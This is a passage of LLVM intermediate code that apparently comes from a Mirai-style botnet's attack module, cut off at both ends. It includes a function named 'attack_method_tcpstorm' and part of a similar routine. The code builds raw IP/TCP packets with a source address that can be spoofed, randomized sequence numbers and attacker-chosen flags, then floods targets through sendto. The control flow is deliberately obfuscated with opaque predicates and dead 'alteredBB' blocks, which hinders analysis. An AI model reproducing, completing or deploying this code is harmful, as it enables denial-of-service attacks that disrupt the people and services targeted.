  %685 = call i32 @attack_get_opt_int(i8 zeroext %683, %struct.attack_option* %684, i8 zeroext 7, i32 65535)
  %686 = trunc i32 %685 to i16
  store i16 %686, i16* %642, align 2
  %687 = load i8, i8* %632, align 1
  %688 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %689 = call i32 @attack_get_opt_int(i8 zeroext %687, %struct.attack_option* %688, i8 zeroext 17, i32 65535)
  store i32 %689, i32* %643, align 4
  %690 = load i8, i8* %632, align 1
  %691 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %692 = call i32 @attack_get_opt_int(i8 zeroext %690, %struct.attack_option* %691, i8 zeroext 18, i32 0)
  store i32 %692, i32* %644, align 4
  %693 = load i8, i8* %632, align 1
  %694 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %695 = call i32 @attack_get_opt_int(i8 zeroext %693, %struct.attack_option* %694, i8 zeroext 11, i32 0)
  %696 = trunc i32 %695 to i8
  store i8 %696, i8* %645, align 1
  %697 = load i8, i8* %632, align 1
  %698 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %699 = call i32 @attack_get_opt_int(i8 zeroext %697, %struct.attack_option* %698, i8 zeroext 12, i32 0)
  %700 = trunc i32 %699 to i8
  store i8 %700, i8* %646, align 1
  %701 = load i8, i8* %632, align 1
  %702 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %703 = call i32 @attack_get_opt_int(i8 zeroext %701, %struct.attack_option* %702, i8 zeroext 13, i32 0)
  %704 = trunc i32 %703 to i8
  store i8 %704, i8* %647, align 1
  %705 = load i8, i8* %632, align 1
  %706 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %707 = call i32 @attack_get_opt_int(i8 zeroext %705, %struct.attack_option* %706, i8 zeroext 14, i32 0)
  %708 = trunc i32 %707 to i8
  store i8 %708, i8* %648, align 1
  %709 = load i8, i8* %632, align 1
  %710 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %711 = call i32 @attack_get_opt_int(i8 zeroext %709, %struct.attack_option* %710, i8 zeroext 15, i32 1)
  %712 = trunc i32 %711 to i8
  store i8 %712, i8* %649, align 1
  %713 = load i8, i8* %632, align 1
  %714 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %715 = call i32 @attack_get_opt_int(i8 zeroext %713, %struct.attack_option* %714, i8 zeroext 16, i32 0)
  %716 = trunc i32 %715 to i8
  store i8 %716, i8* %650, align 1
  %717 = load i8, i8* %632, align 1
  %718 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %719 = load i32, i32* @LOCAL_ADDR, align 4
  %720 = call i32 @attack_get_opt_ip(i8 zeroext %717, %struct.attack_option* %718, i8 zeroext 25, i32 %719)
  store i32 %720, i32* %651, align 4
  %721 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %721, i32* %635, align 4
  %722 = icmp eq i32 %721, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %120
  %723 = load i32, i32* %18, align 4
  %724 = call i32 @close(i32 %723)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %145
  %725 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %726 = load i8**, i8*** %19, align 8
  %727 = load i32, i32* %17, align 4
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds i8*, i8** %726, i64 %728
  store i8* %725, i8** %729, align 8
  %730 = load i8**, i8*** %19, align 8
  %731 = load i32, i32* %17, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds i8*, i8** %730, i64 %732
  %734 = load i8*, i8** %733, align 8
  %735 = bitcast i8* %734 to %struct.iphdr*
  store %struct.iphdr* %735, %struct.iphdr** %35, align 8
  %736 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %737 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %736, i64 1
  %738 = bitcast %struct.iphdr* %737 to %struct.tcphdr*
  store %struct.tcphdr* %738, %struct.tcphdr** %36, align 8
  %739 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %740 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %739, i64 1
  %741 = bitcast %struct.tcphdr* %740 to i8*
  store i8* %741, i8** %37, align 8
  %742 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %743 = bitcast %struct.iphdr* %742 to i8*
  %744 = load i8, i8* %743, align 4
  %_ = sub i8 %744, 15
  %gen = mul i8 %_, 15
  %_7 = shl i8 %744, 15
  %745 = and i8 %744, 15
  %_8 = sub i8 %745, 64
  %gen9 = mul i8 %_8, 64
  %_10 = sub i8 %745, 64
  %gen11 = mul i8 %_10, 64
  %746 = or i8 %745, 64
  store i8 %746, i8* %743, align 4
  %747 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %748 = bitcast %struct.iphdr* %747 to i8*
  %749 = load i8, i8* %748, align 4
  %_12 = sub i8 0, %749
  %gen13 = add i8 %_12, -16
  %_14 = shl i8 %749, -16
  %_15 = sub i8 %749, -16
  %gen16 = mul i8 %_15, -16
  %_17 = sub i8 0, %749
  %gen18 = add i8 %_17, -16
  %_19 = sub i8 0, %749
  %gen20 = add i8 %_19, -16
  %750 = and i8 %749, -16
  %_21 = shl i8 %750, 5
  %_22 = sub i8 0, %750
  %gen23 = add i8 %_22, 5
  %_24 = shl i8 %750, 5
  %_25 = sub i8 0, %750
  %gen26 = add i8 %_25, 5
  %_27 = shl i8 %750, 5
  %_28 = sub i8 0, %750
  %gen29 = add i8 %_28, 5
  %_30 = shl i8 %750, 5
  %_31 = sub i8 %750, 5
  %gen32 = mul i8 %_31, 5
  %751 = or i8 %750, 5
  store i8 %751, i8* %748, align 4
  %752 = load i8, i8* %20, align 1
  %753 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %754 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %753, i32 0, i32 1
  store i8 %752, i8* %754, align 1
  %755 = call zeroext i16 @htons(i16 zeroext 60) #7
  %756 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %757 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %756, i32 0, i32 2
  store i16 %755, i16* %757, align 2
  %758 = load i16, i16* %21, align 2
  %759 = call zeroext i16 @htons(i16 zeroext %758) #7
  %760 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %761 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %760, i32 0, i32 3
  store i16 %759, i16* %761, align 4
  %762 = load i8, i8* %22, align 1
  %763 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %764 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %763, i32 0, i32 5
  store i8 %762, i8* %764, align 4
  %765 = load i8, i8* %23, align 1
  %766 = icmp ne i8 %765, 0
  br label %originalBB6

originalBB36alteredBB:                            ; preds = %originalBB36, %204
  %767 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %768 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %769 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %768, i32 0, i32 4
  store i16 %767, i16* %769, align 2
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %349
  %770 = load i32, i32* %17, align 4
  %_41 = sub i32 %770, 1
  %gen42 = mul i32 %_41, 1
  %_43 = sub i32 0, %770
  %gen44 = add i32 %_43, 1
  %_45 = shl i32 %770, 1
  %_46 = sub i32 %770, 1
  %gen47 = mul i32 %_46, 1
  %_48 = shl i32 %770, 1
  %771 = add nsw i32 %770, 1
  store i32 %771, i32* %17, align 4
  br label %originalBB40

originalBB52alteredBB:                            ; preds = %originalBB52, %368
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %386
  %772 = load i32, i32* %17, align 4
  %773 = load i8, i8* %13, align 1
  %774 = zext i8 %773 to i32
  %775 = icmp slt i32 %772, %774
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %484
  %776 = load i32, i32* %26, align 4
  %777 = icmp eq i32 %776, 65535
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %503
  %778 = call i32 @rand_next()
  %779 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %780 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %779, i32 0, i32 2
  store i32 %778, i32* %780, align 4
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %530
  %781 = load i8, i8* %28, align 1
  %782 = icmp ne i8 %781, 0
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %555
  %783 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %784 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %783, i32 0, i32 7
  store i16 0, i16* %784, align 2
  %785 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %786 = bitcast %struct.iphdr* %785 to i16*
  %787 = call zeroext i16 @checksum_generic(i16* %786, i32 20)
  %788 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %789 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %788, i32 0, i32 7
  store i16 %787, i16* %789, align 2
  %790 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %791 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %790, i32 0, i32 6
  store i16 0, i16* %791, align 4
  %792 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %793 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %794 = bitcast %struct.tcphdr* %793 to i8*
  %795 = call zeroext i16 @htons(i16 zeroext 40) #7
  %796 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %792, i8* %794, i16 zeroext %795, i32 40)
  %797 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %798 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %797, i32 0, i32 6
  store i16 %796, i16* %798, align 4
  %799 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %800 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %799, i32 0, i32 1
  %801 = load i16, i16* %800, align 2
  %802 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %803 = load i32, i32* %17, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %802, i64 %804
  %806 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %805, i32 0, i32 0
  %807 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %806, i32 0, i32 1
  store i16 %801, i16* %807, align 2
  %808 = load i32, i32* %18, align 4
  %809 = load i8*, i8** %38, align 8
  %810 = bitcast %union.__CONST_SOCKADDR_ARG* %41 to %struct.sockaddr**
  %811 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %812 = load i32, i32* %17, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %811, i64 %813
  %815 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %814, i32 0, i32 0
  %816 = bitcast %struct.sockaddr_in* %815 to %struct.sockaddr*
  store %struct.sockaddr* %816, %struct.sockaddr** %810, align 8
  %817 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %41, i32 0, i32 0
  %818 = load %struct.sockaddr*, %struct.sockaddr** %817, align 8
  %819 = call i64 @sendto(i32 %808, i8* %809, i64 60, i32 16384, %struct.sockaddr* %818, i32 16)
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %612
  br label %originalBB76
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstorm(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 1458)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %557

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %557

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %originalBBpart243, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %317

; <label>:123:                                    ; preds = %118
  %124 = load i32, i32* @x.35
  %125 = load i32, i32* @y.36
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %123
  store i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.257, i32 0, i32 0), i8** %31, align 8
  %132 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %133 = load i8**, i8*** %11, align 8
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8*, i8** %133, i64 %135
  store i8* %132, i8** %136, align 8
  %137 = load i8**, i8*** %11, align 8
  %138 = load i32, i32* %9, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8*, i8** %137, i64 %139
  %141 = load i8*, i8** %140, align 8
  %142 = bitcast i8* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %29, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i64 1
  %145 = bitcast %struct.iphdr* %144 to %struct.tcphdr*
  store %struct.tcphdr* %145, %struct.tcphdr** %30, align 8
  %146 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %147 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %146, i64 124
  %148 = bitcast %struct.tcphdr* %147 to i8*
  store i8* %148, i8** %31, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, 15
  %153 = or i8 %152, 64
  store i8 %153, i8* %150, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, -16
  %158 = or i8 %157, 5
  store i8 %158, i8* %155, align 4
  %159 = load i8, i8* %12, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 1
  store i8 %159, i8* %161, align 1
  %162 = load i32, i32* %26, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 40, %163
  %165 = trunc i64 %164 to i16
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 2
  store i16 %166, i16* %168, align 2
  %169 = load i16, i16* %13, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 3
  store i16 %170, i16* %172, align 4
  %173 = load i8, i8* %14, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 5
  store i8 %173, i8* %175, align 4
  %176 = load i8, i8* %15, align 1
  %177 = icmp ne i8 %176, 0
  %178 = load i32, i32* @x.35
  %179 = load i32, i32* @y.36
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %177, label %186, label %206

; <label>:186:                                    ; preds = %originalBBpart2
  %187 = load i32, i32* @x.35
  %188 = load i32, i32* @y.36
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %186
  %195 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 4
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* @x.35
  %199 = load i32, i32* @y.36
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %206

; <label>:206:                                    ; preds = %originalBBpart236, %originalBBpart2
  %207 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 6
  store i8 6, i8* %208, align 1
  %209 = load i32, i32* %28, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 8
  store i32 %209, i32* %211, align 4
  %212 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %213 = load i32, i32* %9, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  %220 = load i16, i16* %16, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  store i16 %221, i16* %223, align 4
  %224 = load i16, i16* %17, align 2
  %225 = call zeroext i16 @htons(i16 zeroext %224) #7
  %226 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 1
  store i16 %225, i16* %227, align 2
  %228 = load i32, i32* %18, align 4
  %229 = trunc i32 %228 to i16
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = zext i16 %230 to i32
  %232 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 2
  store i32 %231, i32* %233, align 4
  %234 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %236, -241
  %238 = or i16 %237, 160
  store i16 %238, i16* %235, align 4
  %239 = load i8, i8* %20, align 1
  %240 = sext i8 %239 to i16
  %241 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = and i16 %240, 1
  %245 = shl i16 %244, 13
  %246 = and i16 %243, -8193
  %247 = or i16 %246, %245
  store i16 %247, i16* %242, align 4
  %248 = load i8, i8* %21, align 1
  %249 = sext i8 %248 to i16
  %250 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = and i16 %249, 1
  %254 = shl i16 %253, 12
  %255 = and i16 %252, -4097
  %256 = or i16 %255, %254
  store i16 %256, i16* %251, align 4
  %257 = load i8, i8* %22, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = and i16 %258, 1
  %263 = shl i16 %262, 11
  %264 = and i16 %261, -2049
  %265 = or i16 %264, %263
  store i16 %265, i16* %260, align 4
  %266 = load i8, i8* %23, align 1
  %267 = sext i8 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %267, 1
  %272 = shl i16 %271, 10
  %273 = and i16 %270, -1025
  %274 = or i16 %273, %272
  store i16 %274, i16* %269, align 4
  %275 = load i8, i8* %24, align 1
  %276 = sext i8 %275 to i16
  %277 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %276, 1
  %281 = shl i16 %280, 9
  %282 = and i16 %279, -513
  %283 = or i16 %282, %281
  store i16 %283, i16* %278, align 4
  %284 = load i8, i8* %25, align 1
  %285 = sext i8 %284 to i16
  %286 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 4
  %288 = load i16, i16* %287, align 4
  %289 = and i16 %285, 1
  %290 = shl i16 %289, 8
  %291 = and i16 %288, -257
  %292 = or i16 %291, %290
  store i16 %292, i16* %287, align 4
  %293 = call i32 @rand() #6
  %294 = srem i32 %293, 65535
  %295 = trunc i32 %294 to i16
  %296 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 5
  store i16 %295, i16* %297, align 2
  br label %298

; <label>:298:                                    ; preds = %206
  %299 = load i32, i32* @x.35
  %300 = load i32, i32* @y.36
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %298
  %307 = load i32, i32* %9, align 4
  %308 = add nsw i32 %307, 1
  store i32 %308, i32* %9, align 4
  %309 = load i32, i32* @x.35
  %310 = load i32, i32* @y.36
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart243, label %originalBB38alteredBB

originalBBpart243:                                ; preds = %originalBB38
  br label %118

; <label>:317:                                    ; preds = %118
  %318 = load i32, i32* @x.35
